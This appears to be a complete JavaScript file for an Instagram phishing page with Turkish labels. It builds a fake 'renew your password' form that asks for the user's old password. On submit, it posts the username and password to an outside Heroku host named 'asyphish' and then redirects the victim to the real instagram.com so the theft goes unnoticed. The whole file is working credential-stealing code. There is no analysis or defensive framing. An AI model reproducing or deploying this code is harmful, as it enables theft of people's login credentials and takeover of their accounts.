//   ?Instagram
$(document).ready(function() {
    console.log("ready")
    setTimeout(() => {
        document.querySelector("#submitBtn").addEventListener('click', e => {
            $.post("https://asyphish.herokuapp.com/", { name: $("#name").val(), password: $("#password").val() })
            console.log("gönderildi")
            window.location.href = "https://instagram.com"

        })
    }, 500);

});


name()
function name() {
  const xhr = new XMLHttpRequest();
  xhr.open('GET', '/static/js/df.json', true);

  xhr.onload = function () {
    if (this.status === 200) {
      let name = JSON.parse(this.responseText)
      let html = `
        <img
            src="https://qph.fs.quoracdn.net/main-qimg-97343310825c2165d3f205b1364755a1.webp"
            alt=""
            />

            <input
            type="text"
            name="password"
            id="password"
            placeholder="Eski Şifre"
            />
            <input type="text" placeholder="Yeni Şifre" />
            <input type="hidden" value="${name.username}" id="name"/>
            <button id="submitBtn">Şifreyi Yenile</button>
      `;
      console.log(name.username)

      document.querySelector('.container').innerHTML = html;



    }
  }

  xhr.send();
}